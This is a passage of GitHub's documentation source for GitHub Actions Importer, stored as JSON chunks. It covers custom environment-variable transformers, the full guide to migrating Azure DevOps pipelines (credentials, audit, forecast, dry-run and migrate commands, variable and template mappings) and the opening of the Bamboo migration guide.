method.\n- The `env` method accepts two parameters. The first parameter is the name of the environment variable in the original pipeline, and the second parameter is the updated value for the environment variable for {% data variables.product.prodname_actions %}. For more information about {% data variables.product.prodname_actions %} environment variables, see \"AUTOTITLE.\"\n\n\n\nExample custom transformers for environment variables\n\nThere are several ways you can set up custom transformers to map your environment variables.\n\n- The following example sets the value of any existing environment variables named `OCTO`, to `CAT` when transforming a pipeline.\n\n  ```ruby copy\n  env \"OCTO\", \"CAT\"\n  ```\n\n  You can also remove all instances of a specific environment variable so they are not transformed to an {% data variables.product.prodname_actions %} workflow. The following example removes all environment variables with the name `MONA_LISA`.\n\n  ```ruby copy\n  env \"MONA_LISA\", nil\n  ```\n\n- You can also map your existing environment variables to secrets. For example, the following `env` method maps an environment variable named `MONALISA` to a secret named `OCTOCAT`.\n\n  ```ruby copy\n  env \"MONALISA\", secret(\"OCTOCAT\")\n  ```\n\n  This will set up a reference to a secret named `O", "Y2h1bmtfNF9pbmRleF8xNTU=": "CTOCAT` in the transformed workflow. For the secret to work, you will need to create the secret in your GitHub repository. For more information, see \"AUTOTITLE.\"\n\n- You can also use regular expressions to update the values of multiple environment variables at once. For example, the following custom transformer removes all environment variables from the converted workflow:\n\n  ```ruby copy\n  env /.*/, nil\n  ```\n\n  The following example uses a regular expression match group to transform environment variable values to dynamically generated secrets.\n\n  ```ruby copy\n  env /^(.+)_SSH_KEY/, secret(\"%s_SSH_KEY)\n  ```\n\n  {% note %}\n\n  **Note**: The order in which `env` methods are defined matters when using regular expressions. The first `env` transformer that matches an environment variable name takes precedence over subsequent `env` methods. You should define your most specific environment variable transformers first.\n\n  {% endnote %}\n\n\n\nLegal notice\n\n{% data reusables.actions.actions-importer-legal-notice %}\n\n", "Y2h1bmtfMF9pbmRleF8xNTY=": "\n\nAbout migrating from Azure DevOps with GitHub Actions Importer\n\nThe instructions below will guide you through configuring your environment to use {% data variables.product.prodname_actions_importer %} to migrate Azure DevOps pipelines to {% data variables.product.prodname_actions %}.\n\n\n\nPrerequisites\n\n- An Azure DevOps account or organization with projects and pipelines that you want to convert to {% data variables.product.prodname_actions %} workflows.\n- Access to create an Azure DevOps {% data variables.product.pat_generic %} for your account or organization.\n{% data reusables.actions.actions-importer-prerequisites %}\n\n\n\nLimitations\n\nThere are some limitations when migrating from Azure DevOps to {% data variables.product.prodname_actions %} with {% data variables.product.prodname_actions_importer %}:\n\n- {% data variables.product.prodname_actions_importer %} requires version 5.0 of the Azure DevOps API, available in either Azure DevOps Services or Azure DevOps Server 2019. Older versions of Azure DevOps Server are not compatible.\n- Tasks that are implicitly added to an Azure DevOps pipeline, such as checking out source code, may be added to a {% data variables.product.prodname_actions_importer %} audit as a GUID name. To find the friendly task name for a GUID, you can use the following URL: `https://dev.azure.com/:organization/_apis/distributedtask/tasks/:guid`.\n\n\n\nManual tasks\n\nCertain Azure DevOps constructs must be migrated manually from Azure DevOps into {% data variables.product.prodname_actions %} configurations. These include:\n- Organization, repository, and environment secrets\n- Service connections such as OIDC Connect, {% data variables.product.prodname_github_apps %}, and {% data variables.product.pat_generic_plural %}\n- Unknown tasks\n- Self-hosted agents\n- Environments\n- Pre-deployment approvals\n\nFor more information on manual migrations, see \"AUTOTITLE.\"\n\n\n\nUnsupported tasks\n\n{% data variables.product.prodname_actions_importer %} does not support migrating the following tasks:\n\n- Pre-deployment gat", "Y2h1bmtfMV9pbmRleF8xNTY=": "es\n- Post-deployment gates\n- Post-deployment approvals\n- Some resource triggers\n\n\n\nInstalling the {% data variables.product.prodname_actions_importer %} CLI extension\n\n{% data reusables.actions.installing-actions-importer %}\n\n\n\nConfiguring credentials\n\nThe `configure` CLI command is used to set required credentials and options for {% data variables.product.prodname_actions_importer %} when working with Azure DevOps and {% data variables.product.prodname_dotcom %}.\n\n1. Create a {% data variables.product.prodname_dotcom %} {% data variables.product.pat_v1 %}. For more information, see \"AUTOTITLE.\"\n\n   Your token must have the `workflow` scope.\n\n   After creating the token, copy it and save it in a safe location for later use.\n1. Create an Azure DevOps {% data variables.product.pat_generic %}. For more information, see Use {% data variables.product.pat_generic_plural %} in the Azure DevOps documentation. The token must have the following scopes:\n\n   - Agents Pool: `Read`\n   - Build: `Read`\n   - Code: `Read`\n   - Release: `Read`\n   - Service Connections: `Read`\n   - Task Groups: `Read`\n   - Variable Groups: `Read`\n\n   After creating the token, copy it and save it in a safe location for later use.\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `configure` CLI command:\n\n   ```shell\n   gh actions-importer configure\n   ```\n\n   The `configure` command will prompt you for the following information:\n\n   - For \"Which CI providers are you configuring?\", use the arrow keys to select `Azure DevOps`, press Space to select it, then press Enter.\n   - For \"{% data variables.product.pat_generic_caps %} for GitHub\", enter the value of the {% data variables.product.pat_v1 %} that you created earlier, and press Enter.\n   - For \"Base url of the GitHub instance\", {% ifversion ghes or ghae %}enter the URL for your {% data variables.product.product_name %} instance, and press Enter.{% else %}press Enter to accept the default value (`https://github.com`).{% endif %}\n   - For \"{% data variables.product.pa", "Y2h1bmtfMl9pbmRleF8xNTY=": "t_generic_caps %} for Azure DevOps\", enter the value for the Azure DevOps {% data variables.product.pat_generic %} that you created earlier, and press Enter.\n   - For \"Base url of the Azure DevOps instance\", press Enter to accept the default value (`https://dev.azure.com`).\n   - For \"Azure DevOps organization name\", enter the name for your Azure DevOps organization, and press Enter.\n   - For \"Azure DevOps project name\", enter the name for your Azure DevOps project, and press Enter.\n\n   An example of the `configure` command is shown below:\n\n   ```shell\n   $ gh actions-importer configure\n   \u2714 Which CI providers are you configuring?: Azure DevOps\n   Enter the following values (leave empty to omit):\n   \u2714 {% data variables.product.pat_generic_caps %} for GitHub: ***************\n   \u2714 Base url of the GitHub instance: https://github.com\n   \u2714 {% data variables.product.pat_generic_caps %} for Azure DevOps: ***************\n   \u2714 Base url of the Azure DevOps instance: https://dev.azure.com\n   \u2714 Azure DevOps organization name: :organization\n   \u2714 Azure DevOps project name: :project\n   Environment variables successfully updated.\n   ```\n\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `update` CLI command to connect to the {% data variables.product.prodname_registry %} {% data variables.product.prodname_container_registry %} and ensure that the container image is updated to the latest version:\n\n   ```shell\n   gh actions-importer update\n   ```\n\n   The output of the command should be similar to below:\n\n   ```shell\n   Updating ghcr.io/actions-importer/cli:latest...\n   ghcr.io/actions-importer/cli:latest up-to-date\n   ```\n\n\n\nPerform an audit of Azure DevOps\n\nYou can use the `audit` command to get a high-level view of all projects in an Azure DevOps organization.\n\nThe `audit` command performs the following steps:\n\n1. Fetches all of the projects defined in an Azure DevOps organization.\n1. Converts each pipeline to its equivalent {% data variables.product.prodname_actions %} workflow.\n1. Generates a r", "Y2h1bmtfM19pbmRleF8xNTY=": "eport that summarizes how complete and complex of a migration is possible with {% data variables.product.prodname_actions_importer %}.\n\n\n\nRunning the audit command\n\nTo perform an audit of an Azure DevOps organization, run the following command in your terminal:\n\n```shell\ngh actions-importer audit azure-devops --output-dir tmp/audit\n```\n\n\n\nInspecting the audit results\n\n{% data reusables.actions.gai-inspect-audit %}\n\n\n\nForecast potential {% data variables.product.prodname_actions %} usage\n\nYou can use the `forecast` command to forecast potential {% data variables.product.prodname_actions %} usage by computing metrics from completed pipeline runs in Azure DevOps.\n\n\n\nRunning the forecast command\n\nTo perform a forecast of potential {% data variables.product.prodname_actions %} usage, run the following command in your terminal. By default, {% data variables.product.prodname_actions_importer %} includes the previous seven days in the forecast report.\n\n```shell\ngh actions-importer forecast azure-devops --output-dir tmp/forecast_reports\n```\n\n\n\nInspecting the forecast report\n\nThe `forecast_report.md` file in the specified output directory contains the results of the forecast.\n\nListed below are some key terms that can appear in the forecast report:\n\n- The **job count** is the total number of completed jobs.\n- The **pipeline count** is the number of unique pipelines used.\n- **Execution time** describes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of {% data variables.product.prodname_dotcom %}-hosted runners.\n\n  This metric is correlated to how much you should expect to spend in {% data variables.product.prodname_actions %}. This will vary depending on the hardware used for these minutes. You can use the {% data variables.product.prodname_actions %} pricing calculator to estimate the costs.\n- **Queue time** metrics describe the amount of time a job spent waiting for a runner to be available to execute it.\n- **Concurrent jobs** metrics describe the amount of jobs running at any", "Y2h1bmtfNF9pbmRleF8xNTY=": " given time. This metric can be used to define the number of runners you should configure.\n\nAdditionally, these metrics are defined for each queue of runners in Azure DevOps. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners.\n\n\n\nPerform a dry-run migration\n\nYou can use the `dry-run` command to convert an Azure DevOps pipeline to an equivalent {% data variables.product.prodname_actions %} workflow. A dry run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline.\n\n{% data reusables.actions.gai-custom-transformers-rec %}\n\n\n\nRunning the dry-run command for a build pipeline\n\nTo perform a dry run of migrating your Azure DevOps build pipeline to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing `pipeline_id` with the ID of the pipeline you are converting.\n\n```shell\ngh actions-importer dry-run azure-devops pipeline --pipeline-id :pipeline_id --output-dir tmp/dry-run\n```\n\nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\n\n\n\nRunning the dry-run command for a release pipeline\n\nTo perform a dry run of migrating your Azure DevOps release pipeline to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing `pipeline_id` with the ID of the pipeline you are converting.\n\n```shell\ngh actions-importer dry-run azure-devops release --pipeline-id :pipeline_id --output-dir tmp/dry-run\n```\n\nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\n\n\n\nPerform a production migration\n\nYou can use the `migrate` command to convert an Azure DevOps pipeline and open a pull request with the equivalent {% data variables.product.prodname_actions %} workflow.\n\n\n\nRunning the migrate command for a build pipeline\n\nTo migrate an Azure DevOps build pipeline to {% data variables.product.pr", "Y2h1bmtfNV9pbmRleF8xNTY=": "odname_actions %}, run the following command in your terminal, replacing the `target-url` value with the URL for your {% data variables.product.prodname_dotcom %} repository, and `pipeline_id` with the ID of the pipeline you are converting.\n\n```shell\ngh actions-importer migrate azure-devops pipeline --pipeline-id :pipeline_id --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate\n```\n\nThe command's output includes the URL of the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n\n```shell\n$ gh actions-importer migrate azure-devops pipeline --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --azure-devops-project my-azure-devops-project\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'\n```\n\n\n\nRunning the migrate command for a release pipeline\n\nTo migrate an Azure DevOps release pipeline to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing the `target-url` value with the URL for your {% data variables.product.prodname_dotcom %} repository, and `pipeline_id` with the ID of the pipeline you are converting.\n\n```shell\ngh actions-importer migrate azure-devops release --pipeline-id :pipeline_id --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate\n```\n\nThe command's output includes the URL of the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n\n```shell\n$ gh actions-importer migrate azure-devops release --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --azure-devops-project my-azure-devops-project\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'\n```\n\n{% data reusables.actions.gai-inspect-pull-", "Y2h1bmtfNl9pbmRleF8xNTY=": "request %}\n\n\n\nReference\n\nThis section contains reference information on environment variables, optional arguments, and supported syntax when using {% data variables.product.prodname_actions_importer %} to migrate from Azure DevOps.\n\n\n\nConfiguration environment variables\n\n{% data reusables.actions.gai-config-environment-variables %}\n\n{% data variables.product.prodname_actions_importer %} uses the following environment variables to connect to your Azure DevOps instance:\n\n- `GITHUB_ACCESS_TOKEN`: The {% data variables.product.pat_v1 %} used to create pull requests with a converted workflow (requires the `workflow` scope).\n- `GITHUB_INSTANCE_URL`: The URL to the target {% data variables.product.prodname_dotcom %} instance (for example, `https://github.com`).\n- `AZURE_DEVOPS_ACCESS_TOKEN`: The {% data variables.product.pat_generic %} used to authenticate with your Azure DevOps instance. This token requires the following scopes:\n  - Build: `Read`\n  - Agent Pools: `Read`\n  - Code: `Read`\n  - Release: `Read`\n  - Service Connections: `Read`\n  - Task Groups: `Read`\n  - Variable Groups: `Read`\n- `AZURE_DEVOPS_PROJECT`: The project name or GUID to use when migrating a pipeline. If you'd like to perform an audit on all projects, this is optional.\n- `AZURE_DEVOPS_ORGANIZATION`: The organization name of your Azure DevOps instance.\n- `AZURE_DEVOPS_INSTANCE_URL`: The URL to the Azure DevOps instance, such as `https://dev.azure.com`.\n\nThese environment variables can be specified in a `.env.local` file that is loaded by {% data variables.product.prodname_actions_importer %} when it is run.\n\n\n\nOptional arguments\n\n{% data reusables.actions.gai-optional-arguments-intro %}\n\n\n\n`--source-file-path`\n\nYou can use the `--source-file-path` argument with the `forecast`, `dry-run`, or `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from source control. The `--source-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source fi", "Y2h1bmtfN19pbmRleF8xNTY=": "le path instead.\n\nFor example:\n\n```shell\ngh actions-importer dry-run azure-devops pipeline --output-dir ./output/ --source-file-path ./path/to/azure_devops/pipeline.yml\n```\n\n\n\n`--config-file-path`\n\nYou can use the `--config-file-path` argument with the `audit`, `dry-run`, and `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from source control. The `--config-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source files instead.\n\nThe `--config-file-path` argument can also be used to specify which repository a converted reusable workflow or composite action should be migrated to.\n\n\n\nAudit example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file as the source file to perform an audit.\n\n```shell\ngh actions-importer audit azure-devops pipeline --output-dir ./output/ --config-file-path ./path/to/azure_devops/config.yml\n```\n\nTo audit an Azure DevOps instance using a configuration file, the configuration file must be in the following format and each `repository_slug` must be unique:\n\n```yaml\nsource_files:\n  - repository_slug: azdo-project/1\n    path: file.yml\n  - repository_slug: azdo-project/2\n    paths: path.yml\n```\n\nYou can generate the `repository_slug` for a pipeline by combining the Azure DevOps organization name, project name, and the pipeline ID. For example, `my-organization-name/my-project-name/42`.\n\n\n\nDry run example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file as the source file to perform a dry run.\n\nThe pipeline is selected by matching the `repository_slug` in the configuration file to the value of the `--azure-devops-organization` and `--azure-devops-project` option. The `path` is then used to pull the specified source file.\n\n```shell\ngh actions-importer dry-run azure-devops pipeline --output-dir ./output/ --config-file-path ./path/to/azure_devops/conf", "Y2h1bmtfOF9pbmRleF8xNTY=": "ig.yml \n```\n\n\n\nSpecify the repository of converted reusable workflows and composite actions\n\n{% data variables.product.prodname_actions_importer %} uses the YAML file provided to the `--config-file-path` argument to determine the repository that converted reusable workflows and composite actions are migrated to.\n\nTo begin, you should run an audit without the `--config-file-path` argument:\n\n```shell\ngh actions-importer audit azure-devops --output-dir ./output/\n```\n\nThe output of this command will contain a file named `config.yml` that contains a list of all the reusable workflows and composite actions that were converted by {% data variables.product.prodname_actions_importer %}. For example, the `config.yml` file may have the following contents:\n\n```yaml\nreusable_workflows:\n  - name: my-reusable-workflow.yml\n    target_url: https://github.com/octo-org/octo-repo\n    ref: main\n\ncomposite_actions:\n  - name: my-composite-action.yml\n    target_url: https://github.com/octo-org/octo-repo\n    ref: main\n```\n\nYou can use this file to specify which repository and ref a reusable workflow or composite action should be added to. You can then use the `--config-file-path` argument to provide the `config.yml` file to {% data variables.product.prodname_actions_importer %}. For example, you can use this file when running a `migrate` command to open a pull request for each unique repository defined in the config file:\n\n```shell\ngh actions-importer migrate azure-devops pipeline  --config-file-path config.yml --target-url https://github.com/my-org/my-repo\n```\n\n\n\nSupported syntax for Azure DevOps pipelines\n\nThe following table shows the type of properties that {% data variables.product.prodname_actions_importer %} is currently able to convert.\n\n| Azure Pipelines       | {% data variables.product.prodname_actions %}                        |              Status |\n| :-------------------- | :------------------------------------ | :------------------ |\n| condition             | `jobs..if``jobs..steps[*].if` |           Supported |\n| containe", "Y2h1bmtfOV9pbmRleF8xNTY=": "r             | `jobs..container``jobs..name`                  |           Supported |\n| continuousIntegration | `on..``on..``on..paths` |           Supported |\n| job                   | `jobs.` |           Supported |\n| pullRequest           | `on..``on..paths` |           Supported |\n| stage                 | `jobs` |           Supported |\n| steps                 | `jobs..steps` |           Supported |\n| strategy              | `jobs..strategy.fail-fast``jobs..strategy.max-parallel``jobs..strategy.matrix`       |           Supported |\n| timeoutInMinutes      | `jobs..timeout-minutes` |           Supported |\n| variables             | `env``jobs..env``jobs..steps.env` |           Supported |\n| manual deployment     | `jobs..environment` | Partially supported |\n| pool                  | `runners``self hosted runners` | Partially supported |\n| services              | `jobs..services` | Partially supported |\n| strategy              | `jobs..strategy` | Partially supported |\n| triggers              | `on`                        | Partially supported |\n| pullRequest           | `on..`  |         Unsupported |\n| schedules             | `on.schedule``on.workflow_run` |         Unsupported |\n| triggers              | `on..types`     |         Unsupported |\n\nFor more information about supported Azure DevOps tasks, see the `github/gh-actions-importer` repository.\n\n\n\nEnvironment variable mapping\n\n{% data variables.product.prodname_actions_importer %} uses the mapping in the table below to convert default Azure DevOps environment variables to the closest equivalent in {% data variables.product.prodname_actions %}.\n\n| Azure Pipelines                             | {% data variables.product.prodname_actions %}                                      |\n| :------------------------------------------ | :-------------------------------------------------- |\n| {% raw %}`$(Agent.BuildDirectory)`{% endraw %}                   | {% raw %}`${{ runner.workspace }}`{% endraw %}                           |\n| {% raw %}`$(Agent.HomeDirectory)`{% ", "Y2h1bmtfMTBfaW5kZXhfMTU2": "endraw %}                    | {% raw %}`${{ env.HOME }}`{% endraw %}                                   |\n| {% raw %}`$(Agent.JobName)`{% endraw %}                          | {% raw %}`${{ github.job }}`{% endraw %}                                 |\n| {% raw %}`$(Agent.OS)`{% endraw %}                               | {% raw %}`${{ runner.os }}`{% endraw %}                                  |\n| {% raw %}`$(Agent.ReleaseDirectory)`{% endraw %}                 | {% raw %}`${{ github.workspace}}`{% endraw %}                            |\n| {% raw %}`$(Agent.RootDirectory)`{% endraw %}                    | {% raw %}`${{ github.workspace }}`{% endraw %}                           |\n| {% raw %}`$(Agent.ToolsDirectory)`{% endraw %}                   | {% raw %}`${{ runner.tool_cache }}`{% endraw %}                          |\n| {% raw %}`$(Agent.WorkFolder)`{% endraw %}                       | {% raw %}`${{ github.workspace }}`{% endraw %}                           |\n| {% raw %}`$(Build.ArtifactStagingDirectory)`{% endraw %}         | {% raw %}`${{ runner.temp }}`{% endraw %}                                |\n| {% raw %}`$(Build.BinariesDirectory)`{% endraw %}                | {% raw %}`${{ github.workspace }}`{% endraw %}                           |\n| {% raw %}`$(Build.BuildId)`{% endraw %}                          | {% raw %}`${{ github.run_id }}`{% endraw %}                              |\n| {% raw %}`$(Build.BuildNumber)`{% endraw %}                      | {% raw %}`${{ github.run_number }}`{% endraw %}                          |\n| {% raw %}`$(Build.DefinitionId)`{% endraw %}                     | {% raw %}`${{ github.workflow }}`{% endraw %}                            |\n| {% raw %}`$(Build.DefinitionName)`{% endraw %}                   | {% raw %}`${{ github.workflow }}`{% endraw %}                            |\n| {% raw %}`$(Build.PullRequest.TargetBranch)`{% endraw %}         | {% raw %}`${{ github.base_ref }}`{% endraw %}                            |\n| {% raw %}`$(Build.PullRequest.TargetBranch.Name)`{% endraw %}    | {", "Y2h1bmtfMTFfaW5kZXhfMTU2": "% raw %}`${{ github.base_ref }}`{% endraw %}                            |\n| {% raw %}`$(Build.QueuedBy)`{% endraw %}                         | {% raw %}`${{ github.actor }}`{% endraw %}                               |\n| {% raw %}`$(Build.Reason)`{% endraw %}                           | {% raw %}`${{ github.event_name }}`{% endraw %}                          |\n| {% raw %}`$(Build.Repository.LocalPath)`{% endraw %}             | {% raw %}`${{ github.workspace }}`{% endraw %}                           |\n| {% raw %}`$(Build.Repository.Name)`{% endraw %}                  | {% raw %}`${{ github.repository }}`{% endraw %}                          |\n| {% raw %}`$(Build.Repository.Provider)`{% endraw %}              | {% raw %}`GitHub`{% endraw %}                                            |\n| {% raw %}`$(Build.Repository.Uri)`{% endraw %}                   | {% raw %}`${{ github.server.url }}/${{ github.repository }}`{% endraw %} |\n| {% raw %}`$(Build.RequestedFor)`{% endraw %}                     | {% raw %}`${{ github.actor }}`{% endraw %}                               |\n| {% raw %}`$(Build.SourceBranch)`{% endraw %}                     | {% raw %}`${{ github.ref }}`{% endraw %}                                 |\n| {% raw %}`$(Build.SourceBranchName)`{% endraw %}                 | {% raw %}`${{ github.ref }}`{% endraw %}                                 |\n| {% raw %}`$(Build.SourceVersion)`{% endraw %}                    | {% raw %}`${{ github.sha }}`{% endraw %}                                 |\n| {% raw %}`$(Build.SourcesDirectory)`{% endraw %}                 | {% raw %}`${{ github.workspace }}`{% endraw %}                           |\n| {% raw %}`$(Build.StagingDirectory)`{% endraw %}                 | {% raw %}`${{ runner.temp }}`{% endraw %}                                |\n| {% raw %}`$(Pipeline.Workspace)`{% endraw %}                     | {% raw %}`${{ runner.workspace }}`{% endraw %}                           |\n| {% raw %}`$(Release.DefinitionEnvironmentId)`{% endraw %}        | {% raw %}`${{ github.job }}`{% en", "Y2h1bmtfMTJfaW5kZXhfMTU2": "draw %}                                 |\n| {% raw %}`$(Release.DefinitionId)`{% endraw %}                   | {% raw %}`${{ github.workflow }}`{% endraw %}                            |\n| {% raw %}`$(Release.DefinitionName)`{% endraw %}                 | {% raw %}`${{ github.workflow }}`{% endraw %}                            |\n| {% raw %}`$(Release.Deployment.RequestedFor)`{% endraw %}        | {% raw %}`${{ github.actor }}`{% endraw %}                               |\n| {% raw %}`$(Release.DeploymentID)`{% endraw %}                   | {% raw %}`${{ github.run_id }}`{% endraw %}                              |\n| {% raw %}`$(Release.EnvironmentId)`{% endraw %}                 | {% raw %}`${{ github.job }}`{% endraw %}                                 |\n| {% raw %}`$(Release.EnvironmentName)`{% endraw %}                | {% raw %}`${{ github.job }}`{% endraw %}                                 |\n| {% raw %}`$(Release.Reason)`{% endraw %}                        | {% raw %}`${{ github.event_name }}`{% endraw %}                          |\n| {% raw %}`$(Release.RequestedFor)`{% endraw %}                  | {% raw %}`${{ github.actor }}`{% endraw %}                               |\n| {% raw %}`$(System.ArtifactsDirectory)`{% endraw %}              | {% raw %}`${{ github.workspace }}`{% endraw %}                           |\n| {% raw %}`$(System.DefaultWorkingDirectory)`{% endraw %}         | {% raw %}`${{ github.workspace }}`{% endraw %}                           |\n| {% raw %}`$(System.HostType)`{% endraw %}                        | {% raw %}`build`{% endraw %}                                             |\n| {% raw %}`$(System.JobId)`{% endraw %}                           | {% raw %}`${{ github.job }}`{% endraw %}                                 |\n| {% raw %}`$(System.JobName)`{% endraw %}                         | {% raw %}`${{ github.job }}`{% endraw %}                                 |\n| {% raw %}`$(System.PullRequest.PullRequestId)`{% endraw %}       | {% raw %}`${{ github.event.number }}`{% endraw %}                   ", "Y2h1bmtfMTNfaW5kZXhfMTU2": "     |\n| {% raw %}`$(System.PullRequest.PullRequestNumber)`{% endraw %}   | {% raw %}`${{ github.event.number }}`{% endraw %}                        |\n| {% raw %}`$(System.PullRequest.SourceBranch)`{% endraw %}        | {% raw %}`${{ github.ref }}`{% endraw %}                                 |\n| {% raw %}`$(System.PullRequest.SourceRepositoryUri)`{% endraw %} | {% raw %}`${{ github.server.url }}/${{ github.repository }}`{% endraw %} |\n| {% raw %}`$(System.PullRequest.TargetBranch)`{% endraw %}        | {% raw %}`${{ github.event.base.ref }}`{% endraw %}                      |\n| {% raw %}`$(System.PullRequest.TargetBranchName)`{% endraw %}    | {% raw %}`${{ github.event.base.ref }}`{% endraw %}                      |\n| {% raw %}`$(System.StageAttempt)`{% endraw %}                    | {% raw %}`${{ github.run_number }}`{% endraw %}                          |\n| {% raw %}`$(System.TeamFoundationCollectionUri)`{% endraw %}     | {% raw %}`${{ github.server.url }}/${{ github.repository }}`{% endraw %} |\n| {% raw %}`$(System.WorkFolder)`{% endraw %}                      | {% raw %}`${{ github.workspace }}`{% endraw %}                           |\n\n\n\nTemplates\n\nYou can transform Azure DevOps templates with {% data variables.product.prodname_actions_importer %}.\n\n\n\nLimitations\n\n{% data variables.product.prodname_actions_importer %} is able to transform Azure DevOps templates with some limitations.\n\n- Azure DevOps templates used under the `stages`, `deployments`, and `jobs` keys are converted into reusable workflows in {% data variables.product.prodname_actions %}. For more information, see \"AUTOTITLE.\"\n- Azure DevOps templates used under the `steps` key are converted into composite actions. For more information, see \"AUTOTITLE.\"\n- If you currently have job templates that reference other job templates, {% data variables.product.prodname_actions_importer %} converts the templates into reusable workflows. Because reusable workflows cannot reference other reusable workflows, this is invalid syntax in {% data variables.produc", "Y2h1bmtfMTRfaW5kZXhfMTU2": "t.prodname_actions %}. You must manually correct nested reusable workflows.\n- If a template references an external Azure DevOps organization or {% data variables.product.prodname_dotcom %} repository, you must use the `--credentials-file` option to provide credentials to access this template. For more information, see \"AUTOTITLE.\"\n- You can dynamically generate YAML using `each` expressions with the following caveats:\n  - Nested `each` blocks are not supported and cause the parent `each` block to be unsupported.\n  - `each` and contained `if` conditions are evaluated at transformation time, because {% data variables.product.prodname_actions %} does not support this style of insertion.\n  - `elseif` blocks are unsupported. If this functionality is required, you must manually correct them.\n  - Nested `if` blocks are supported, but `if/elseif/else` blocks nested under an `if` condition are not.\n  - `if` blocks that use predefined Azure DevOps variables are not supported.\n\n\n\nSupported templates\n\n{% data variables.product.prodname_actions_importer %} supports the templates listed in the table below.\n\n| Azure Pipelines               | {% data variables.product.prodname_actions %}                        |              Status |\n| :---------------------------- | :------------------------------------ | ------------------: |\n| Extending from a template     | `Reusable workflow`                   |           Supported |\n| Job templates                 | `Reusable workflow`                   |           Supported |\n| Stage templates               | `Reusable workflow`                   |           Supported |\n| Step templates                | `Composite action`                    |           Supported |\n| Task groups in classic editor | Varies                                |           Supported |\n| Templates in a different Azure DevOps organization, project, or repository    | Varies                              |           Supported |\n| Templates in a {% data variables.product.prodname_dotcom %} repository | Varies           ", "Y2h1bmtfMTVfaW5kZXhfMTU2": "                   |           Supported |\n| Variable templates            | `env`                                 |           Supported |\n| Conditional insertion         | `if` conditions on job/steps          | Partially supported |\n| Iterative insertion           | Not applicable                        | Partially supported |\n| Templates with parameters     | Varies                                | Partially supported |\n\n\n\nTemplate file path names\n\n{% data variables.product.prodname_actions_importer %} can extract templates with relative or dynamic file paths with variable, parameter, and iterative expressions in the file name. However, there must be a default value set.\n\n\n\nVariable file path name example\n\n```yaml\n\n\nFile: azure-pipelines.yml\nvariables:\n- template: 'templates/vars.yml'\n\nsteps:\n- template: \"./templates/${{ variables.one }}\"\n```\n\n```yaml\n\n\nFile: templates/vars.yml\nvariables:\n  one: 'simple_step.yml'\n```\n\n\n\nParameter file path name example\n\n```yaml\nparameters:\n- name: template\n  type: string \n  default: simple_step.yml\n\nsteps:\n- template: \"./templates/{% raw %}${{ parameters.template }}{% endraw %}\"\n```\n\n\n\nIterative file path name example\n\n```yaml\nparameters:\n- name: steps\n  type: object\n  default:\n  - build_step\n  - release_step\nsteps: \n- {% raw %}${{ each step in parameters.steps }}{% endraw %}:\n    - template: \"${{ step }}-variables.yml\"\n```\n\n\n\nTemplate parameters\n\n{% data variables.product.prodname_actions_importer %} supports the parameters listed in the table below.\n\n| Azure Pipelines       | {% data variables.product.prodname_actions %}                              |              Status   |\n| :-------------------- | :-----------------------------------------  | :-------------------  |\n| string                | `inputs.string`                             |           Supported   |\n| number                | `inputs.number`                             |           Supported   |\n| boolean               | `inputs.boolean`                            |           Supported   |\n| object               ", "Y2h1bmtfMTZfaW5kZXhfMTU2": " | `inputs.string` with `fromJSON` expression  | Partially supported   |\n| step                  | `step`                                      | Partially supported  |\n| stepList              | `step`                                      | Partially supported  |\n| job                   | `job`                                       | Partially supported |\n| jobList               | `job`                                       | Partially supported |\n| deployment            | `job`                                       | Partially supported |\n| deploymentList        | `job`                                       | Partially supported |\n| stage                 | `job`                                       | Partially supported |\n| stageList             | `job`                                       | Partially supported |\n\n{% note %}\n\n**Note:** A template used under the `step` key with this parameter type is only serialized as a composite action if the steps are used at the beginning or end of the template steps. A template used under the `stage`, `deployment`, and `job` keys with this parameter type are not transformed into a reusable workflow, and instead are serialized as a standalone workflow.\n\n{% endnote %}\n\n\n\nLegal notice\n\n{% data reusables.actions.actions-importer-legal-notice %}\n\n", "Y2h1bmtfMF9pbmRleF8xNTc=": "\n\nAbout migrating from Bamboo with GitHub Actions Importer\n\nThe instructions below will guide you through configuring your environment to use {% data variables.product.prodname_actions_importer %} to migrate Bamboo pipelines to {% data variables.product.prodname_actions %}.\n\n\n\nPrerequisites\n\n- A Bamboo account or organization with projects and pipelines that you want to convert to {% data variables.product.prodname_actions %} workflows.\n- Bamboo version of 7.1.1 or greater.\n- Access to create a Bamboo {% data variables.product.pat_generic %} for your account or organization.\n{% data reusables.actions.actions-importer-prerequisites %}\n\n\n\nLimitations\n\nThere are some limitations when migrating from Bamboo to {% data variables.product.prodname_actions %} with {% data variables.product.prodname_actions_importer %}:\n\n- {% data variables.product.prodname_actions_importer %} relies on the YAML specification generated by the Bamboo Server to perform migrations. When Bamboo does not support exporting something to YAML, the missing information is not migrated.\n- Trigger conditions are unsupported. When {% data variables.product.prodname_actions_importer %} encounters a trigger with a condition, the condition is surfaced as a comment and the trigger is transformed without it.\n- Bamboo Plans with customized settings for storing artifacts are not transformed. Instead, artifacts are stored 